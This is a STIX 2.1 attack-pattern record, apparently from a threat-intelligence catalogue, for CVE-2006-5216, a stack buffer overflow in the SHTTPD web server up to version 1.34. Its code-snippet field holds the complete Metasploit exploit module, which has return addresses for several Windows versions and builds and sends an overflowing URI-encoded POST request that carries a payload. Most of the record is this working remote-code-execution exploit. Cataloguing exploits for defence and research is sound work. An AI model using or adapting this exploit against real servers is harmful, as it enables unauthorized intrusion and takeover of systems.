{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6ad76088-5738-476f-9b46-642324efda78",
    "created": "2024-08-14T16:55:46.467351Z",
    "modified": "2024-08-14T16:55:46.467355Z",
    "name": "SHTTPD URI-Encoded POST Request Overflow",
    "description": " This module exploits a stack buffer overflow in SHTTPD <= 1.34. The vulnerability is caused due to a boundary error within the handling of POST requests. Based on an original exploit by skOd but using a different method found by hdm. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/shttpd_post.rb",
            "external_id": "shttpd_post.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-5216"
        },
        {
            "source_name": "reference",
            "url": "http://shttpd.sourceforge.net"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'SHTTPD URI-Encoded POST Request Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in SHTTPD <= 1.34.\n        The vulnerability is caused due to a boundary error within the\n        handling of POST requests. Based on an original exploit by skOd\n        but using a different method found by hdm.\n      },\n      'Author'         => [ 'LMH <lmh[at]info-pull.com>', 'hdm', 'skOd'],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2006-5216'],\n          [ 'OSVDB', '29565' ],\n          [ 'URL', 'http://shttpd.sourceforge.net'],\n          [ 'BID', '20393'],\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # Except for Spanish locale target, all come from:\n          [ 'Windows NT English SP5-SP6',\t\t\t{ 'Ret' => 0x776a183a } ],\n          [ 'Windows 2000 Spanish SP4',\t\t\t{ 'Ret' => 0x79496391 } ],\n          [ 'Windows 2000 French SP4',\t\t\t{ 'Ret' => 0x74fb108d } ],\n          [ 'Windows 2000 English SP0-SP4',\t\t\t{ 'Ret' => 0x75021421 } ],\n          [ 'Windows 2000 French SP0-SP4',\t\t\t{ 'Ret' => 0x74fa3144 } ],\n          [ 'Windows 2003 Server English SP0-SP1',\t{ 'Ret' => 0x77d877d3 } ],\n          [ 'Windows XP German SP2',\t\t\t\t{ 'Ret' => 0x71a02975 } ],\n          [ 'Windows XP German SP1',\t\t\t\t{ 'Ret' => 0x71a02a6a } ],\n          [ 'Windows XP English SP2',\t\t\t\t{ 'Ret' => 0x71aa1e08 } ],\n          [ 'Windows XP English SP0-SP1',\t\t\t{ 'Ret' => 0x71aa1aaa } ],\n        ],\n      'DisclosureDate' => '2006-10-06'))\n\n    register_options(\n      [\n        Opt::RPORT(80)\n      ])\n  end\n\n  def exploit\n    connect\n\n    pat = rand_text_alphanumeric(4000)\n    pat[8,4] = [target.ret].pack('V')\n    pat[103, payload.encoded.length] = payload.encoded\n    pat = Rex::Text.uri_encode(pat)\n\n    res = \"post /#{pat} HTTP/1.0\\r\\n\\r\\n\"\n\n    print_status(\"Trying target address 0x%.8x...\" % target.ret)\n    sock.put(res)\n    sock.close\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-10-06",
    "x_mitre_platforms": [
        "win'"
    ]
}